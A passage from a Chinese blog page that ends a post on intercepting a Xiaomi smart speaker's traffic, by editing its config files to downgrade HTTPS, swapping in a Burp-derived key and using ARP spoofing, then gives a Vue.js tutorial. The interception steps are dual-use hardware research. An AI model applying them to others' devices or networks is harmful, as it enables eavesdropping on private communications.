+<p>接下来看一下开机脚本init.d中的内容，东西挺多的我也不举例了，这里我改了开机脚本里miio的选项，打开了debug日志：<br><img src="https://i.loli.net/2020/06/05/lUPmjOptrd6nhbo.jpg" alt="A415D81C-A6FD-475E-A30F-DC6A85190821"><br>然后重启一下好了（即便你说只需要重启应用就行，但是我就喜欢reboot）<br>重启完后tail一下/tmp/log/miio.log<br><img src="https://i.loli.net/2020/06/05/WrSYbetKg2a4n68.jpg" alt><br>就能看到很多有趣的东西了，有时候即使抓不到包，这个debug日志里也会打印部分请求体。</p>
+<p>##0x04尝试通过修改配置文件饶过https证书校验<br>目前看来总共有三块https要绕过：</p>
+<p>####1. /usr/share/mico/messaging/messaging.conf 包含了初始化的一些接口<br>大概展示一下配置文件：<br><img src="https://i.loli.net/2020/06/05/PHxygOQ8idF1EVb.jpg" alt><br>通过替换里面的https为http(上图是已经替换了的)，可以绕过部分接口的https问题，并且看下来http也是支持的可以不用强制转为https。</p>
+<p>####2. /usr/share/mico/messaging/mediaplayer.cfg 包含了另一些接口，同时有信任的CA证书路径<br>对于该文件有两种思路，一种是替换里面的https为http，另一种是将ca证书路径更改为burp的证书路径。我试试看第二种看看行不行，即指改动certs文件夹的路径，更改后的文件夹是我自己建的，里面放的是burp的ca证书<br><img src="https://i.loli.net/2020/06/05/EIpB72nNbCHx1ol.jpg" alt><br>后面我放弃了改ca路径，还是回到https替换成http的思路上来了。</p>
+<p>####3. 替换pub文件<br>/usr/share/mico/messaging/messaging.conf 有记录了一个pub文件，猜测是校验特定接口的公钥时候用的，目前看来可能是*.ai.xiaomi.com这个地址的pub文件<br><img src="https://i.loli.net/2020/06/04/oBfWEXkPdCuScDL.jpg" alt><br>绕过思路是通过burp的ca生成一个pub来替换。 </p>
+<p>先从burp中导出私钥<br><img src="https://i.loli.net/2020/06/04/KB2HjJuodtRX3OP.jpg" alt><br>通过命令<code>openssl rsa -inform DER -in priburp -pubout -out burp.pub</code><br>生成公钥文件，然后上传到小爱上去替换掉原来的server_2.pub文件<br><img src="https://i.loli.net/2020/06/05/Tj3MQCuJs87DobO.jpg" alt><br>修改配置文件中的pub文件配置为burp.pub<br><img src="https://i.loli.net/2020/06/05/YQrDsIkZnmh2Wu4.jpg" alt></p>
+<p>####4. 重启一下，见证奇迹<br>三个操作都做完了，我们重启后分别观察是否正常………………OK，并不行，主要是第三个pub文件替换没有效果，看起来那个account-dcm.ai.xiaomi.com地址的https并不受这几个pub文件控制（至少我把我能看到的pub文件都替换了）。<br>OK换个思路，我直接去找包含这个域名的文件，结果如下：<br><img src="https://i.loli.net/2020/06/05/Xfzy5WjQOKGi3Pd.jpg" alt><br>既然找到了这个so，我直接修改这个so里的https到http试一下吧，为了以防万一我先备份一个，然后直接vim修改so里的https为http，结果保存一下再重启………………<br>好吧没什么用，看日志似乎直接报错了，估计得放弃部分接口的https了（这一个so后面得再研究一下）</p>
+<p>####5. 认栽，还原so和pub文件<br>还原so和pub文件，为了让https通过，我们将信任证书路径的操作也还原，统一该用https替换http的方式来抓取部分接口先做测试吧。最终结果如下：<br><img src="https://i.loli.net/2020/06/05/tx37QjOcKEAClfq.jpg" alt></p>
+<p>####6. 一些问题<br>虽然已经是可以抓到部分接口的包了，但是一开始我们将这些接口替换成http后，部分接口会出现403错误，这个时候我们需要将他们再重新定向到443端口：<br><img src="https://i.loli.net/2020/06/05/9eLWqY1holSUCma.jpg" alt><br>这样那些443的接口就会正常了，但是这又会导致部分原本就是http的接口出现没有响应，因为他们也被强制定向到443了。这个问题手工到时候再解决一下。</p>
+<p>##0x05 总结<br>暂时先到这里，针对抓包而言，arp欺骗到代理，基本上是什么都能抓的，唯一比较麻烦的是https的证书校验。抛开https，其他的tcp、udp其实也是可以这样直接劫持修改的。<br>后面我会继续没事折腾一下小爱，还是挺好玩的，这次分享的话就先在这里结束掉吧。</p>
+<p>PS：如果有人因为看了这个而去抓包怼小爱接口找到了万把块钱的漏洞，希望能请我喝杯瑞幸咖啡。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/vue的学习（下）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/12/vue的学习（下）/" itemprop="url">vue的学习（下）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-12T10:43:37+08:00">
+                2020-04-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/javascript/" itemprop="url" rel="index">
+                    <span itemprop="name">javascript</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-表单"><a href="#0x00-表单" class="headerlink" title="0x00 表单"></a>0x00 表单</h2><p>直接看这个里面的示例吧<a href="https://www.runoob.com/vue2/vue-forms.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-forms.html</a></p>
+<h2 id="0x01-组件"><a href="#0x01-组件" class="headerlink" title="0x01 组件"></a>0x01 组件</h2><h3 id="全局组件"><a href="#全局组件" class="headerlink" title="全局组件"></a>全局组件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">runoob</span>&gt;</span><span class="tag">&lt;/<span class="name">runoob</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">// 注册</span></span><br><span class="line"><span class="undefined">Vue.component('runoob', &#123;</span></span><br><span class="line"><span class="xml">  template: '<span class="tag">&lt;<span class="name">h1</span>&gt;</span>自定义组件!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="局部组件"><a href="#局部组件" class="headerlink" title="局部组件"></a>局部组件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">runoob</span>&gt;</span><span class="tag">&lt;/<span class="name">runoob</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var Child = &#123;</span></span><br><span class="line"><span class="xml">  template: '<span class="tag">&lt;<span class="name">h1</span>&gt;</span>自定义组件!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  components: &#123;</span></span><br><span class="line"><span class="xml">    // <span class="tag">&lt;<span class="name">runoob</span>&gt;</span> 将只在父模板可用</span></span><br><span class="line"><span class="undefined">    'runoob': Child</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="prop：父组件向子组件传递信息"><a href="#prop：父组件向子组件传递信息" class="headerlink" title="prop：父组件向子组件传递信息"></a>prop：父组件向子组件传递信息</h3><p>Prop可以理解为组件设定的某个“属性”，父组件通过设置组件的这个属性来动态传递参数<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">"parentMsg"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">child</span> <span class="attr">v-bind:message</span>=<span class="string">"parentMsg"</span>&gt;</span><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">// 注册</span></span><br><span class="line"><span class="undefined">Vue.component('child', &#123;</span></span><br><span class="line"><span class="undefined">  // 声明 props</span></span><br><span class="line"><span class="undefined">  props: ['message'],</span></span><br><span class="line"><span class="undefined">  // 同样也可以在 vm 实例中像 "this.message" 这样使用</span></span><br><span class="line"><span class="xml">  template: '<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    parentMsg: '父组件内容'</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="prop验证参数"><a href="#prop验证参数" class="headerlink" title="prop验证参数"></a>prop验证参数</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">Vue.component('my-component', &#123;</span></span><br><span class="line"><span class="undefined">  props: &#123;</span></span><br><span class="line"><span class="undefined">    // 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证)</span></span><br><span class="line"><span class="undefined">    propA: Number,</span></span><br><span class="line"><span class="undefined">    // 多个可能的类型</span></span><br><span class="line"><span class="undefined">    propB: [String, Number],</span></span><br><span class="line"><span class="undefined">    // 必填的字符串</span></span><br><span class="line"><span class="undefined">    propC: &#123;</span></span><br><span class="line"><span class="undefined">      type: String,</span></span><br><span class="line"><span class="undefined">      required: true</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    // 带有默认值的数字</span></span><br><span class="line"><span class="undefined">    propD: &#123;</span></span><br><span class="line"><span class="undefined">      type: Number,</span></span><br><span class="line"><span class="undefined">      default: 100</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    // 带有默认值的对象</span></span><br><span class="line"><span class="undefined">    propE: &#123;</span></span><br><span class="line"><span class="undefined">      type: Object,</span></span><br><span class="line"><span class="undefined">      // 对象或数组默认值必须从一个工厂函数获取</span></span><br><span class="line"><span class="undefined">      default: function () &#123;</span></span><br><span class="line"><span class="undefined">        return &#123; message: 'hello' &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    // 自定义验证函数</span></span><br><span class="line"><span class="undefined">    propF: &#123;</span></span><br><span class="line"><span class="undefined">      validator: function (value) &#123;</span></span><br><span class="line"><span class="undefined">        // 这个值必须匹配下列字符串中的一个</span></span><br><span class="line"><span class="undefined">        return ['success', 'warning', 'danger'].indexOf(value) !== -1</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="自定义事件：子组件向父组件传递信息"><a href="#自定义事件：子组件向父组件传递信息" class="headerlink" title="自定义事件：子组件向父组件传递信息"></a>自定义事件：子组件向父组件传递信息</h3><p>子组件需要向父组件传递一些信息的时候，可以通过事件触发的形式，父组件通过v-on来监听特定事件，监听的时候是可以传递参数的.<br>①由于父组件需要参数，所以在父组件中的标签上定义自定义事件，在事件内部获取参数；『@myEvent=” callback”在callback函数中接收参数』<br>②在子组件中触发自定义事件，并传参。『this.$ emit(‘父组件中的自定义事件’,参数)』</p>
+<h3 id="组件间通信"><a href="#组件间通信" class="headerlink" title="组件间通信"></a>组件间通信</h3><p>非父子组件间一般通过新建一个空的vue实例，来作为中间件进行通信：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app12"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-component12</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component12</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var bus = new Vue();//建立空的bus实例</span></span><br><span class="line"><span class="undefined">Vue.component('my-component12',&#123;</span></span><br><span class="line"><span class="xml">	template: '<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"updateMessage"</span>&gt;</span>传递事件信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span>',</span></span><br><span class="line"><span class="undefined">	methods: &#123;</span></span><br><span class="line"><span class="undefined">	updateMessage: function()&#123;</span></span><br><span class="line"><span class="undefined">	bus.$emit('updateMessage','更新我的组件信息'); //利用中介bus传播事件</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined">var app12 = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">	el: '#app12',</span></span><br><span class="line"><span class="undefined">	data:&#123;</span></span><br><span class="line"><span class="undefined">	message: ''</span></span><br><span class="line"><span class="undefined">	&#125;,</span></span><br><span class="line"><span class="undefined">mounted: function()&#123;</span></span><br><span class="line"><span class="undefined">	var _this = this; //这一步赋值必须有</span></span><br><span class="line"><span class="undefined">	bus.$on('updateMessage',function(data)&#123; //利用中介bus接收事件</span></span><br><span class="line"><span class="undefined">	_this.message = data;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="组件的data"><a href="#组件的data" class="headerlink" title="组件的data"></a>组件的data</h3><p>关于组件里的data属性，一般建议要写成函数形式，避免多个组件实例里相互影响，如果是常数的话可以不用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:function()&#123;</span><br><span class="line">return &#123;</span><br><span class="line">xxx:111</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-自定义指令"><a href="#0x02-自定义指令" class="headerlink" title="0x02 自定义指令"></a>0x02 自定义指令</h2><p>简单的示例：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>页面载入时，input 元素自动获取焦点：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-focus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">// 注册一个全局自定义指令 v-focus</span></span><br><span class="line"><span class="undefined">Vue.directive('focus', &#123;</span></span><br><span class="line"><span class="undefined">  // 当绑定元素插入到 DOM 中。</span></span><br><span class="line"><span class="undefined">  inserted: function (el) &#123;</span></span><br><span class="line"><span class="undefined">    // 聚焦元素</span></span><br><span class="line"><span class="undefined">    el.focus()</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 创建根实例</span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app'</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这是全局的，类似的，在实例里通过directives属性可以设置一个局部的<br>更多可以看：<a href="https://www.runoob.com/vue2/vue-custom-directive.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-custom-directive.html</a><br>感觉不会常用</p>
+<h2 id="0x03-路由（重要）"><a href="#0x03-路由（重要）" class="headerlink" title="0x03 路由（重要）"></a>0x03 路由（重要）</h2><p><a href="https://www.runoob.com/vue2/vue-routing.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-routing.html</a></p>
+<h2 id="0x04-ajax（axios）"><a href="#0x04-ajax（axios）" class="headerlink" title="0x04 ajax（axios）"></a>0x04 ajax（axios）</h2><p>Vue2.0推荐axios，<a href="https://www.runoob.com/vue2/vuejs-ajax-axios.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vuejs-ajax-axios.html</a></p>
+<h3 id="GET和POST实例"><a href="#GET和POST实例" class="headerlink" title="GET和POST实例"></a>GET和POST实例</h3><p>都一样的GET换成POST就好了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>网站列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">    <span class="attr">v-for</span>=<span class="string">"site in info"</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">    &#123;&#123; site.name &#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data () &#123;</span></span><br><span class="line"><span class="undefined">    return &#123;</span></span><br><span class="line"><span class="undefined">      info: null</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  mounted () &#123;</span></span><br><span class="line"><span class="undefined">    axios</span></span><br><span class="line"><span class="undefined">      .get('https://www.runoob.com/try/ajax/json_demo.json')</span></span><br><span class="line"><span class="undefined">      .then(response =&gt; (this.info = response.data.sites))</span></span><br><span class="line"><span class="undefined">      .catch(function (error) &#123; // 请求失败处理</span></span><br><span class="line"><span class="undefined">        console.log(error);</span></span><br><span class="line"><span class="undefined">      &#125;);</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>传参两种写法：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 直接在 URL 上添加参数 ID=12345</span><br><span class="line">axios.get('/user?ID=12345')</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br><span class="line"> </span><br><span class="line">// 也可以通过 params 设置参数：</span><br><span class="line">axios.get('/user', &#123;</span><br><span class="line">    params: &#123;</span><br><span class="line">      ID: 12345</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(function (response) &#123;</span><br><span class="line">    console.log(response);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(function (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></p>
+<p>执行多个请求<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getUserAccount() &#123;</span><br><span class="line">  return axios.get('/user/12345');</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function getUserPermissions() &#123;</span><br><span class="line">  return axios.get('/user/12345/permissions');</span><br><span class="line">&#125;</span><br><span class="line">axios.all([getUserAccount(), getUserPermissions()])</span><br><span class="line">  .then(axios.spread(function (acct, perms) &#123;</span><br><span class="line">    // 两个请求现在都执行完成</span><br><span class="line">  &#125;));</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-简单实例"><a href="#0x05-简单实例" class="headerlink" title="0x05 简单实例"></a>0x05 简单实例</h2><p><a href="https://www.runoob.com/vue2/vue-examples.html" target="_blank" rel="noopener">https://www.runoob.com/vue2/vue-examples.html</a></p>
+<h2 id="0x06-常用框架"><a href="#0x06-常用框架" class="headerlink" title="0x06 常用框架"></a>0x06 常用框架</h2><p><a href="https://element.eleme.cn/#/en-US" target="_blank" rel="noopener">https://element.eleme.cn/#/en-US</a><br><a href="https://vuetifyjs.com/zh-Hans/getting-started/quick-start/" target="_blank" rel="noopener">https://vuetifyjs.com/zh-Hans/getting-started/quick-start/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/11/一些不太健康的资料/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/11/一些不太健康的资料/" itemprop="url">一些不太健康的资料</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
